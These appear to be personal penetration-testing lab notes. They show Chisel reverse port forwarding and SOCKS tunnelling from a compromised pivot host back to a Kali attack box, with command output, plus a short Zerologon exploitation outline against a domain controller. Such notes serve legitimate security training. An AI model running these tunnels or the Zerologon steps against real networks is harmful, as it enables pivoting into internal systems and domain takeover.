https://www.youtube.com/watch?v=pbR_BNSOaMk


# REVERSE PORT FORWARDING
## In Kali Attack machine (#1)
***Explanation:***
Setting up a reverse socks5 server on our kali attacking machine, by default on port 8080
```zsh
┌──(root💀gobots)-[05Mar2024 23:55:09]-[/opt/chisel]
└─# ./chisel_linux_amd64 server --socks5 --reverse
2024/03/05 23:55:33 server: Reverse tunnelling enabled
2024/03/05 23:55:33 server: Fingerprint 6bDaN0rUnulKJAQbpC1feeX+s5COPvZl6Nao0bHA+UQ=
2024/03/05 23:55:33 server: Listening on http://0.0.0.0:8080
2024/03/05 23:58:04 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2024/03/05 23:58:04 server: session#1: tun: proxy#R:8000=>172.16.1.30:80: Listening
```
## On Pivot Machine (#2)
***Explanation:***
- Utilizing fingerprint from the server results above.
- `10.10.14.39:8080` = the server IP address and port to connect to the server on.
- `R:` = Reverse port forward to state that we are pulling stuff back to our kali box.
- `8000:172.16.1.30:80` = Port 8000 on the kali box we want to map to the `172.16.1.30` on port `80`
```zsh
root@NIX01:~# ./chisel_64 client --fingerprint 6bDaN0rUnulKJAQbpC1feeX+s5COPvZl6Nao0bHA+UQ= 10.10.14.39:8080 R:8000:172.16.1.30:80
<6Nao0bHA+UQ= 10.10.14.39:8080 R:8000:172.16.1.30:80
2024/03/05 15:59:09 client: Connecting to ws://10.10.14.39:8080
2024/03/05 15:59:09 client: Fingerprint 6bDaN0rUnulKJAQbpC1feeX+s5COPvZl6Nao0bHA+UQ=
2024/03/05 15:59:09 client: Connected (Latency 31.057469ms)
```
# Testing
So now when we are browsing to port `8000` on our local host we will see the `port 80` on the `172.16.1.30`
- here we can see the web server.
![[Pasted image 20240305213758.png]]
# SOCKS PROXY

## In Kali Attack machine (#1)
***Explanation:***
Setting up a reverse socks5 server on our kali attacking machine, by default on port 8080
```zsh
┌──(root💀gobots)-[05Mar2024 23:55:09]-[/opt/chisel]
└─# ./chisel_linux_amd64 server --socks5 --reverse
2024/03/05 23:55:33 server: Reverse tunnelling enabled
2024/03/05 23:55:33 server: Fingerprint 6bDaN0rUnulKJAQbpC1feeX+s5COPvZl6Nao0bHA+UQ=
2024/03/05 23:55:33 server: Listening on http://0.0.0.0:8080
2024/03/05 23:58:04 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2024/03/05 23:58:04 server: session#1: tun: proxy#R:8000=>172.16.1.30:80: Listening
2024/03/06 02:44:26 server: session#2: Client version (1.7.7) differs from server version (0.0.0-src)
2024/03/06 02:44:26 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

## On Pivot Machine (#2)
***Explanation:***
- Utilizing fingerprint from the server results above.
- `10.10.14.39:8080` = the server IP address and port to connect to the server on.
- `R:` = Reverse port forward to state that we are pulling stuff back to our kali box.
- `socks` = utilize the port associated with `1080` ensure to change `/etc/proxychains`
```zsh
root@NIX01:~# ./chisel_64 client --fingerprint 6bDaN0rUnulKJAQbpC1feeX+s5COPvZl6Nao0bHA+UQ= 10.10.14.39:8080 R:socks
<1feeX+s5COPvZl6Nao0bHA+UQ= 10.10.14.39:8080 R:socks
2024/03/05 18:45:31 client: Connecting to ws://10.10.14.39:8080
2024/03/05 18:45:31 client: Fingerprint 6bDaN0rUnulKJAQbpC1feeX+s5COPvZl6Nao0bHA+UQ=
2024/03/05 18:45:31 client: Connected (Latency 28.564871ms)
```
changing proxychains conf
![[Pasted image 20240305214756.png]]
# Testing that it works
***Testing via curl***
![[Pasted image 20240305215001.png]]
***FoxyProxy setup***
- ensure to turn on
![[Pasted image 20240305215123.png]]
***Able to browse***
![[Pasted image 20240305215157.png]]
# Forward Dynamic SOCKS Proxy
- Run the Chisel server on the target box
- Use the target box as a jump host to reach additional targets routable by the target
- The traffic flows forward to the target box, which acts as a transparent SOCKS proxy
#### **Network Diagram**
```powershell

  SCENARIO
   --------
 You have landed on a target that has access to ADDITIONAL TARGET(s) and/or ADDITIONAL ROUTE(s)
  Run a CHISEL SERVER ON TARGET BOX and connect to it using a CHISEL CLIENT ON ATTACK BOX

   Open 127.0.0.1:50080 on attack box and use this TCP connection as a SOCKS5 proxy
All traffic flowing through the SOCKS5 proxy will be routed by TARGET BOX to any specified destination
  
   CHISEL CLIENT and CHISEL SERVER establish a TCP session using HTTP web sockets
  The port forwarding is secured between the two using SSH tunnels flowing through the web sockets
  
  
 _____________________                                                                                                       _____________________                             _______                _______
|                     |                                                                                                     |                     |                           |       |              |       |
|                     |                        ___________________________________________________                          |                     |                           |       |    _______   |       |          
|     ATTACK BOX      |                       |                 ===============>>                 |                         |     TARGET BOX      | <<===================>>    -------    |       |   -------
|                     | =====[SSH TUNNEL]=====|                 [HTTP WEB SOCKET]                 |=====[SSH TUNNEL]=====>> |                     | -----SOCKS5 PROXY----->               |       |
|    CHISEL CLIENT    | |                     |___________________________________________________|                         |    CHISEL SERVER    | <<===================>>    _______     -------    _______
|                     | |                                                                                                   |                     |                           |       |              |       |
|_____________________| |                                                                                                   |_____________________|                           |       |              |       |  
                        |                                                                                                                                                      -------                -------
   127.0.0.1:50080------'                                                                                                                                                      ADDITIONAL TARGETS OR NETWORKS
```

## Chisel Server on Target

```zsh
# Chisel server is listening on TCP port 51234
# Make sure this port is open in the firewall
/tmp/chisel server --socks5 --port 51234
```

## Chisel Client on Attack Box

```zsh
 # Open a single SOCKS5 proxy port on the attack box                                                                                                                      
/tmp/chisel client target-box-ip:51234 50080:socks
                                        ^
                                        |____attack-port:socks
```


# zerologon
```powershell
my notes weren't the greatest but short is get secretsdump PRIOR to exploit to get machine hash, throw metasploit exploit to blank it, run secretsdump, then exploit again with restore.  The hash should look something like this 
$:plain_password_hex:0c684056d1dab8685146827fb42f719b516f1d5f3ba9128486a543413ae778b0f67ec2d05bd4c084cfd9c16995977c5fb4b638cb07b2b33208c7a2cd73b587942b369bfa243c5532c05c4159b9e63b9fbfd77dc458739b687d285071e8776944bc8845bba499bba2d471dae635af4d038628e663903553983c480bc7af3ac9d4dc7004bb814b0c30cc9ae31ede19263fd49a27bb9aeaa622091f5b4d83652066352a3034da68392f1bb650d94e86731ee43c42a46a49d7c8ddad2ae6f006e067a436f79186dc48197f289fa5f24c0967b48bb5723d2b4e37345c1adb4042d5b63976469cb74b2ddac6d9c9ce83af200d
[4:50 PM]
if you compare secretsdump before and after exploit and they match, you have done it right
```


DC -> Kali client port forward

On Kali Machine Target
setting up chisel server on port 1000
```bash
# Chisel server is listening on TCP port 445
# Make sure this port is open in the firewall
/tmp/chisel server --socks5 --port 1000
```

Full Explanation:
172.16.5.194:1000 = connecting the chisel server and client on port 1000
DC IP:8000:172.16.5.194:445  = anything that is hitting the DC on port 8000 get forwarded to 172.16.5.194 on port 445
```bash
# Example shows multiple port forwards
# You can specify one or many port forwards
# Add or remove port forward declarations as needed
C:\windows\tasks\chisel_windows client 172.16.5.194:1000 <DC IP>:8000:172.16.5.194:445 
```




